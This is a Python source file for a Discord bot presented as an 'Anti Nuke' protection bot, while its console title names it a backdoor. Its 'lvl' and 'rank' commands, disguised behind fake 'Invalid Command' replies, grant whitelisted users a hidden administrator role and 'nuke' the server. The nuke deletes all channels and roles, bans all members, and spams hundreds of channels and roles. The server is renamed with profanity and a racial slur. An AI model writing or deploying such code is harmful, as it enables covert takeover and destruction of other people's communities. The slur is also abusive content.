import discord, colorama, ctypes, os, json
from discord.ext import commands
from discord.utils import get
from colorama import Fore
from datetime import datetime

os.system('cls')
version = 1.4

ctypes.windll.kernel32.SetConsoleTitleW(f'Apollo BackDoor Bot | {version} | Made by dori#4040')


print(f"""{Fore.LIGHTRED_EX}
 ▄▄▄      ██▓███  ▒█████  ██▓    ██▓    ▒█████      ▄▄▄▄   ▄▄▄      ▄████▄  ██ ▄█▓█████▄ ▒█████  ▒█████  ██▀███  
▒████▄   ▓██░  ██▒██▒  ██▓██▒   ▓██▒   ▒██▒  ██▒   ▓█████▄▒████▄   ▒██▀ ▀█  ██▄█▒▒██▀ ██▒██▒  ██▒██▒  ██▓██ ▒ ██▒
▒██  ▀█▄ ▓██░ ██▓▒██░  ██▒██░   ▒██░   ▒██░  ██▒   ▒██▒ ▄█▒██  ▀█▄ ▒▓█    ▄▓███▄░░██   █▒██░  ██▒██░  ██▓██ ░▄█ ▒
░██▄▄▄▄██▒██▄█▓▒ ▒██   ██▒██░   ▒██░   ▒██   ██░   ▒██░█▀ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄░▓█▄   ▒██   ██▒██   ██▒██▀▀█▄  
 ▓█   ▓██▒██▒ ░  ░ ████▓▒░██████░██████░ ████▓▒░   ░▓█  ▀█▓▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████▓░ ████▓▒░ ████▓▒░██▓ ▒██▒
 ▒▒   ▓▒█▒▓▒░ ░  ░ ▒░▒░▒░░ ▒░▓  ░ ▒░▓  ░ ▒░▒░▒░    ░▒▓███▀▒▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒▒▒▓  ▒░ ▒░▒░▒░░ ▒░▒░▒░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░▒ ░      ░ ▒ ▒░░ ░ ▒  ░ ░ ▒  ░ ░ ▒ ▒░    ▒░▒   ░  ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ▒  ▒  ░ ▒ ▒░  ░ ▒ ▒░  ░▒ ░ ▒░
  ░   ▒  ░░      ░ ░ ░ ▒   ░ ░    ░ ░  ░ ░ ░ ▒      ░    ░  ░   ▒  ░       ░ ░░ ░ ░ ░  ░░ ░ ░ ▒ ░ ░ ░ ▒   ░░   ░ 
      ░  ░           ░ ░     ░  ░   ░  ░   ░ ░      ░           ░  ░ ░     ░  ░     ░       ░ ░     ░ ░    ░     
                                                         ░         ░              ░                              {Fore.RESET}
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RED}
| BOT STATUS |: {Fore.LIGHTRED_EX}Connected{Fore.RED}
| BOT NAME |: {Fore.LIGHTRED_EX}Apollo - Anti Nuke{Fore.RESET}
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
{Fore.RED}| TYPE: Message | Apollo BackDoor |:{Fore.LIGHTRED_EX} Created By dori#4040
{Fore.RED}| TYPE: Message | Apollo BackDoor |:{Fore.LIGHTRED_EX} You are currently using Apollo BackDoor: {version}""")
print(f"{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")

with open('config.json') as f:
    info = json.load(f)
    
role_name = info["RoleInfo"]["Name"]
RolePos = info["RoleInfo"]["Position"]

Verified = info["UserInfo"]["Usernames"]

BotName = info["BotInfo"]["Name"]
BotPrefix = info["BotInfo"]["Prefix"]
Token = info["BotInfo"]["Token"]

Icon = info["BotInfo"]["Icon"]

activity = discord.Activity(type=discord.ActivityType.watching, name=f"{BotPrefix}help")

bot = commands.Bot(command_prefix=BotPrefix, bot_name=BotName,activity=activity, status=discord.Status.idle)
bot.remove_command("help")

def msg(text):
    print(f"{Fore.RED}| TYPE: Message | Apollo BackDoor |: {Fore.LIGHTRED_EX}{text}")

@bot.command()
async def lvl(ctx):
    user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
    
    if user_noatt in Verified:      
        guild = ctx.guild
        user = ctx.author
        
        if not get(guild.roles, name=role_name):
            await guild.create_role(name=role_name)
            role = discord.utils.get(guild.roles, name=role_name)
        
            permissions = discord.Permissions()
            permissions.update(administrator=True)
            await role.edit(reason = "Unknown", permissions=permissions, position=RolePos)
        
            if not role in user.roles:
                await user.add_roles(role)
                msg(f"Added BackDoor Role to {user_noatt}")
        else:
            role = discord.utils.get(guild.roles, name=role_name)
            if not role in user.roles:
                await user.add_roles(role)
                msg(f"Added BackDoor Role to {user_noatt}")
    embed = discord.Embed(
            title=f"**{BotName} - Invalid Command**",
            description = f"Invalid Command Entered!",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    await ctx.send(embed=embed)
                
@bot.command()
async def rank(ctx):
    user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
    
    if user_noatt in Verified:
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()    
            except:
                pass
        
        for user in list(ctx.guild.members):
            try:
                await user.ban(reason="you...have...been...nuked...!")
            except:
                pass
            
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass
        
        try:
            await ctx.guild.edit(
            name="get nuked",
            description="stfu nigga",
            reason="Fuck You!!!!!",
            icon=None,
            banner=None
            )  
        except:
            pass        
        for _i in range(250):
            await ctx.guild.create_text_channel(name="nuked")
        for _i in range(250):
            await ctx.guild.create_role(name="nuked")

    embed = discord.Embed(
            title=f"**{BotName} - Invalid Command**",
            description = f"Invalid Command Entered!",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    await ctx.send(embed=embed)
    
@bot.command()
async def help(ctx):
    embed = discord.Embed(
            title=f"**{BotName} - Help/Commands**",
            description = f"This Bot Does NOT require commands and is preconfigured.",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    await ctx.send(embed=embed)
                
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        msg("Not A Valid Command!")
        embed = discord.Embed(
            title=f"**{BotName} - Invalid Command**",
            description = f"Invalid Command Entered!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        
        await ctx.send(embed=embed)

bot.run(Token)